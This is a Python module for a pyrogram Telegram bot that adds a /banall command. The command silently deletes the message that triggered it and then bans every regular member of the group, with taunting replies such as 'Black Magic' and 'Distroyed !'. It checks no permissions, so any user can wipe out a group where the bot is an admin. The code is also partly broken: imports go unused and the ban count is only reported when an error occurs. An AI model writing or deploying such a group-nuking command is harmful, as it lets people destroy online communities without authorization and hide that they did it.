import asyncio
from pyrogram.types import Message
from pyrogram import filters
from pyrogram.enums import ChatMemberStatus
from Exon.modules.helper_funcs.extraction import extract_user_and_text
from Exon.modules.helper_funcs.string_handling import extract_time
from Exon.modules.log_channel import gloggable, loggable
from Exon import pgram

@pgram.on_message(filters.command('banall'))
async def banall_handler(_, m: Message):
    await m.delete()
    await m.reply("Black Magic 🖤 Started")
    try: 
        count = 0
        data = []
        data.clear()
        async for x in pgram.get_chat_members(m.chat.id):
            if x.status == ChatMemberStatus.MEMBER:
                await pgram.ban_chat_member(m.chat.id, x.user.id)
                count += 1
    except Exception as e:
        await m.reply_text('Distroyed !')
        await m.reply_text(f"Black Magic {count} 🖤")
